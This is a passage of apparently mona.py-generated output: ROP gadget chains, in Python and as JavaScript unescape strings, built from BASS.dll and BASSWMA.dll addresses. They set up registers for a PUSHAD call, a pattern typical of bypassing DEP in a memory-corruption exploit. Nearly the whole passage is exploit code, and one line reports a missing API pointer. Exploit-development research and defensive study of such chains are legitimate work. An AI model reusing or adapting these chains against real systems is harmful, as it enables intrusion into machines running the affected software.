      0x1001bfa2,  # ADD EAX,5E20408B # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  # POP ECX # RETN [BASSWMA.dll] 
      0xffffffff,  #  
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x1001dc04,  # POP EDI # RETN [BASS.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax
    "%ueaf1%u1001" + // 0x1001eaf1 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u0157%u1001" + // 0x10010157 : ,# POP EBP # RETN [BASS.dll] 
    "%u539f%u1010" + // 0x1010539f : ,# & jmp esp [BASSWMA.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u5fe7%u1001" + // 0x10015fe7 : ,# POP EAX # RETN [BASS.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u4db4%u1001" + // 0x10014db4 : ,# NEG EAX # RETN [BASS.dll] 
    "%u2f32%u1003" + // 0x10032f32 : ,# XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u5f77%u1001" + // 0x10015f77 : ,# POP EAX # RETN [BASS.dll] 
    "%ucf75%ua1df" + // 0xa1dfcf75 : ,# put delta into eax (-> put 0x00001000 into edx)
    "%ubfa2%u1001" + // 0x1001bfa2 : ,# ADD EAX,5E20408B # RETN [BASS.dll] 
    "%u8a6c%u1003" + // 0x10038a6c : ,# XCHG EAX,EDX # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u49ec%u1010" + // 0x101049ec : ,# POP ECX # RETN [BASSWMA.dll] 
    "%uffff%uffff" + // 0xffffffff : ,#
    "%u1194%u1002" + // 0x10021194 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "%u5fe0%u1001" + // 0x10015fe0 : ,# INC ECX # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%udc04%u1001" + // 0x1001dc04 : ,# POP EDI # RETN [BASS.dll] 
    "%udc05%u1001" + // 0x1001dc05 : ,# RETN (ROP NOP) [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

